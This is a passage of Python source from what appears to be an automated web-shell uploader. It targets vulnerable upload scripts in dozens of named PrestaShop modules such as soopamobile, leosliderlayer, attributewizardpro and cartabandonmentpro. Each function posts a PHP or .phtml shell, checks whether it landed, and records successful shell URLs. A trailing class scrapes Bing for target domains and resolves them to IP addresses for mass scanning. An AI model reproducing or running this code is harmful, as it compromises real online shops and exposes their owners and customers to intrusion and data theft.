	def premeg2(self, url):
		#

		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/megaproduct/index.php')
			c = (url+'/modules/megaproduct/Uploader_By_Cloud7_Agath.php')
			oih = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Megaproduct 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Megaproduct 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def soof(self, url):
		try:
			data = {'userfile':open (php, rb)}
			p = (url+'/modules/soopamobile/uploadimage.php')
			c = (url+'/modules/soopamobile/slides/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Soopamobile{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Soopamobile{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def soof2(self, url):
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/soopamobile2/uploadimage.php')
			c = (url+'/modules/soopamobile2/slides/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Soopamobile 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Soopamobile 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def soof3(self, url):
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/soopamobile3/uploadimage.php')
			c = (url+'/modules/soopamobile3/slides/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Soopamobile 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Soopamobile 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def soof4(self, url):
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+"/modules/soopabanners/uploadimage.php")
			c = (url+'/modules/soopabanners/slides/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Soopabanners{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Soopabanners{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def fupload(self, url):
		#
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/filesupload/upload.php')
			c = (url+'/modules/filesupload/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Files Upload{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Files Upload{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jro(self, url):
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/jro_homepageadvertise/uploadimage.php')
			c = (url+'/modules/jro_homepageadvertise/slides/Uploader_By_Cloud7_Agath.php')
			ads = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}JRO_HOMEPAGEADVERTISE{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}JRO_HOMEPAGEADVERTISE{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def jro2(self, url):
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/jro_homepageadvertise2/uploadimage.php')
			c = (url+'/modules/jro_homepageadvertise2/slides/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}JRO_HOMEPAGEADVERTISE 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}JRO_HOMEPAGEADVERTISE 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def leo(self, url):
		#
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/leosliderlayer/uploadimage.php')
			c = (url+'/modules/leosliderlayer/slides/Uploader_By_Cloud7_Agath.php')
			qa = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Leosliderlayer{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Leosliderlayer{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def leo2(self, url):
		#
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/leosliderlayer/upload_images.php')
			c = (url+'/modules/leosliderlayer/slides/Uploader_By_Cloud7_Agath.php')
			qwe = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Leosliderlayer 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Leosliderlayer 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def leo3(self, url):
		#
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/leosliderlayer/upload.php')
			c = (url+'/modules/leosliderlayer/slides/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Leosliderlayer 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Leosliderlayer 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def kitter(self, url):
		#
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/vtemskitter/uploadimage.php')
			c = (url+'/modules/vtemskitter/img/Uploader_By_Cloud7_Agath.php')
			qqqq = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Vtemskitter{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Vtemskitter{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def kitter2(self, url):
		#
		try:
			data = {'userfile':open (phpjpg, 'rb')}
			p = (url+'/modules/vtemskitter/uploadimage.php')
			c = (url+'/modules/vtemskitter/img/Uploader_By_Cloud7_Agath.php.jpg')
			po = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Vtemskitter 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Vtemskitter 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def add(self, url):
		#
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/additionalproductstabs/file_upload.php')
			c = (url+'/modules/additionalproductstabs/file_uploads/Uploader_By_Cloud7_Agath.php')
			asdqw = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Additionalproductstabs{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Additionalproductstabs{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def addthis(self, url):
		#
		try:

			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/addthisplugin/file_upload.php')
			c = (url+'/modules/addthisplugin/file_uploads/Uploader_By_Cloud7_Agath.php')
			ad = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Additionalproductstabs 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Additionalproductstabs 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def attri(self, url):
		#
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/attributewizardpro/file_upload.php')
			c = (url+'/modules/attributewizardpro/file_uploads/Uploader_By_Cloud7_Agath.php')
			qwe = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Attributewizardpro{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Attributewizardpro{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def attriold(self, url):
		#
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/attributewizardpro.OLD/file_upload.php')
			c = (url+'/modules/attributewizardpro.OLD/file_uploads/Uploader_By_Cloud7_Agath.php')
			pop = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Attributewizardpro 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Attributewizardpro 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def attri3(self, url):
		#
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/attributewizardpro1/file_upload.php')
			c = (url+'/modules/attributewizardpro1/file_uploads/Uploader_By_Cloud7_Agath.php')
			dfkls = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Attributewizardpro 3{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Attributewizardpro 3{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def advance(self, url):
		#
		try:
			data = {'qqfile':open (php, 'rb')}
			p = (url+'/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php')
			c = (url+'/modules/advancedslider/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Ajax_Advancedslider{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Ajax_Advancedslider{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def carta(self, url):
		#
		try:
			path = ['/cartabandonmentpro/', '/cartabandonmentproOld/', '/cartabandonmentpro_Old/', '/cartabandonmentpro2/']
			data = {'image':open (phtml, 'rb')}
			for dick in path:
				p = (url+'/modules'+dick+'upload.php')
				c = (url+'/modules'+dick+'uploads/Uploader_By_Cloud7_Agath.php')
				aaa = requests.post(p, headers=headers, files=data)
				get = requests.get(c, headers=headers, timeout=9)
				if 'Uploader_By_Cloud7_Agath_' in get.content:
					print('[PrestaShop] {}{}{} ||{}Cartabandonmentpro{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
				else:
					print('[PrestaShop] {}{}{} ||{}Cartabandonmentpro{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def vid(self, url):
		# 
		try:
			data = {'userfile':open (php, 'rb')}
			p = (url+'/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload')
			c = (url+'/modules/videostab/uploads/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Videostab{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Videostab{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def fieldmm(self, url):
		#
		try:
			data = {'images[]':open (phpjpg, 'rb')}
			p = (url+'/modules/fieldvmegamenu/ajax/upload.php')
			c = (url+'/modules/fieldvmegamenu/uploads/Uploader_By_Cloud7_Agath.php.jpg')
			oihu = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Fieldvmegamenu{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Fieldvmegamenu{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def fieldmm2(self, url):
		#
		try:
			data = {'images[]':open (php, 'rb')}
			p = (url+'/modules/fieldvmegamenu/ajax/upload.php')
			c = (url+'/modules/fieldvmegamenu/uploads/Uploader_By_Cloud7_Agath.php')
			hj = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Fieldvmegamenu 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Fieldvmegamenu 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def order(self, url):
		#
		try:
			data = {'images[]':open (phpjpg, 'rb')}
			p = (url+'/modules/orderfiles/ajax/upload.php')
			c = (url+'/modules/orderfiles/files/Uploader_By_Cloud7_Agath.php.jpg')
			qew = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Orderfiles{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Orderfiles{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def order2(self, url):
		#
		try:
			data = {'images[]':open (php, 'rb')}
			p = (url+'/modules/orderfiles/ajax/upload.php')
			c = (url+'/modules/orderfiles/files/Uploader_By_Cloud7_Agath.php')
			kjh = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Orderfiles 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Orderfiles 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def pkflex(self, url):
		#
		try:
			path = ['/pk_flexmenu/', '/pk_flexmenu_old/', '/pk_flexmenu_2/']
			data = {'images[]':open (phpjpg, 'rb')}
			for dick in path:
				p = (url+'/modules'+dick+'ajax/upload.php')
				c = (url+'/modules'+dick+'uploads/Uploader_By_Cloud7_Agath.php.jpg')
				ig = requests.post(p, headers=headers, files=data)
				get = requests.get(c, headers=headers, timeout=9)
				if 'Uploader_By_Cloud7_Agath_' in get.content:
					print('[PrestaShop] {}{}{} ||{}Pk Flexmenu{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
				else:
					print('[PrestaShop] {}{}{} ||{}Pk Flexmenu{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def pkflex2(self, url):
		#
		try:
			path = ['/pk_flexmenu/', '/pk_flexmenu_old/', '/pk_flexmenu_2/']
			data = {'images[]':open (php, 'rb')}
			for dick in path:
				p = (url+'/modules'+dick+'ajax/upload.php')
				c = (url+'/modules'+dick+'uploads/Uploader_By_Cloud7_Agath.php')
				asdria = requests.post(p, headers=headers, files=data)
				get = requests.get(c, headers=headers, timeout=9)
				if 'Uploader_By_Cloud7_Agath_' in get.content:
					print('[PrestaShop] {}{}{} ||{}Pk Flexmenu 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
				else:
					print('[PrestaShop] {}{}{} ||{}Pk Flexmenu 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def pkvert(self, url):
		# 
		try:
			data = {'images[]':open (php, 'rb')}
			p = (url+'/modules/pk_vertflexmenu/ajax/upload.php')
			c = (url+'/modules/pk_vertflexmenu/uploads/Uploader_By_Cloud7_Agath.php')
			qwer = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Pk Vertflexmenu{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Pk Vertflexmenu{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def pkvert2(self, url):
		try:
			data = {'images[]':open (phpjpg, 'rb')}
			p = (url+'/modules/pk_vertflexmenu/ajax/upload.php')
			c = (url+'/modules/pk_vertflexmenu/uploads/Uploader_By_Cloud7_Agath.php.jpg')
			iu = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Pk Vertflexmenu 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Pk Vertflexmenu 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def nvmex(self, url):
		try:
			data = {'images[]':open (phpjpg, 'rb')}
			p = (url+'/modules/nvn_export_orders/upload.php')
			c = (url+'/modules/nvn_export_orders/Uploader_By_Cloud7_Agath.php.jpg')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Nvn Export{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Nvn Export{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def nvmex2(self, url):
		try:
			data = {'images[]':open (php, 'rb')}
			p = (url+'/modules/nvn_export_orders/upload.php')
			c = (url+'/modules/nvn_export_orders/Uploader_By_Cloud7_Agath.php')
			kklkljkl = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Nvn Export 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Nvn Export 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def tdps(self, url):
		#
		try:
			data = {'image_upload':open (php, 'rb')}
			p = (url+'/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php')
			c = (url+'/modules/tdpsthemeoptionpanel/upload/Uploader_By_Cloud7_Agath.php')
			askfdh = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Tdpsthemeoptionpanel{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Tdpsthemeoptionpanel{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def tdps2(self, url):
		#
		try:
			data = {'image_upload':open (phpjpg, 'rb')}
			p = (url+'/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php')
			c = (url+'/modules/tdpsthemeoptionpanel/upload/Uploader_By_Cloud7_Agath.php.jpg')
			hugas = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Tdpsthemeoptionpanel 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Tdpsthemeoptionpanel 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def psmod(self, url):
		#
		try:
			data = {'image_upload':open (php, 'rb')}
			p = (url+'/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php')
			c = (url+'/modules/psmodthemeoptionpanel/upload/Uploader_By_Cloud7_Agath.php')
			ehfjd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Psmodthemeoptionpanel{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Psmodthemeoptionpanel{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def psmod2(self, url):
		#
		try:
			data = {'image_upload':open (phpjpg, 'rb')}
			p = (url+'/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php')
			c = (url+'/modules/psmodthemeoptionpanel/upload/Uploader_By_Cloud7_Agath.php.jpg')
			jasdf = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Psmodthemeoptionpanel 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Psmodthemeoptionpanel 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def redactor(self, url):

		#
		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/modules/lib/redactor/file_upload.php')
			c = (url+'/masseditproduct/uploads/file/Uploader_By_Cloud7_Agath.php')
			afjshas = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Redactor{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:

				print('[PrestaShop] {}{}{} ||{}Redactor{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def redactor2(self, url):
		try:
			data = {'file':open (phpjpg, 'rb')}
			p = (url+'/modules/lib/redactor/file_upload.php')
			c = (url+'/masseditproduct/uploads/file/Uploader_By_Cloud7_Agath.php.jpg')
			kjbhjb = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Redactor 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Redactor 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	
	def blocktesti(self, url):
		try:
			data = {'userfile':open (phtml, 'rb')}
			p = (url+'/modules/blocktestimonial/addtestimonial.php')
			c = (url+'/upload/Uploader_By_Cloud7_Agath.phtml')
			hklefd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[PrestaShop] {}{}{} ||{}Blocktestimonial{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Blocktestimonial{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def wg24(self, url):
		try:
			payload = {'data': 'bajatax', 'type': 'pattern_upload'}
			shell = {'bajatax':open (phtml, 'rb')}
			p = (url+'/modules/wg24themeadministration/wg24_ajax.php')
			c = (url+'/modules/wg24themeadministration/img/upload/Uploader_By_Cloud7_Agath.phtml')
			jshdf = requests.post(p, headers=headers, files=shell, data=payload)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[{}WordPress{}] {}')
				open('Result/PrestaShop_Shell.txt', 'a').write(c+'\n')
			else:
				print('[PrestaShop] {}{}{} ||{}Wg24themeadministration{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


class males():
	def randomdomen(self):
		bo = raw_input("List Keywords : ")
		bo = open(bo, 'r')
		for oaja in bo:
			sa = []
			tu = 1
			while tu < 500:
				bing0 = "http://www.bing.com/search?q="+oaja+"+&count=50&first="+str(tu)
				iyoo = requests.get(bing0,verify=False,headers=headers)
				rrr = iyoo.content
				sip = re.findall('<h2><a href="(.*?)"', rrr)
				for i in sip:
					o = i.split('/')
					if (o[0]+'//'+o[2]) in sa:
						pass
					else:
						sa.append(o[0]+'//'+o[2])
						print '[{}>>>{}]'.format(fm,fp), (o[0]+'//'+o[2])
						with open('Random.txt', 'a') as s:
							s.writelines((o[0]+'//'+o[2])+'\n')
				tu = tu+50
	def getIP(self):
		n = raw_input('Domain List : ')
		with open(n) as f:
			for i in f:
				lol = i.strip()
				try:
					if 'http://' not in lol:
						IP1 = socket.gethostbyname(lol)
						print '[{}>>>{}]'.format(fm,fp) + IP1
						open('IP.txt', 'a').write(IP1+'\n')
					elif 'http://' in lol:
						url = lol.replace('http://', '').replace('https://', '').replace('/', '')
						IP2 = socket.gethostbyname(url)
						print '[{}>>>{}]'.format(fm,fp) + IP2
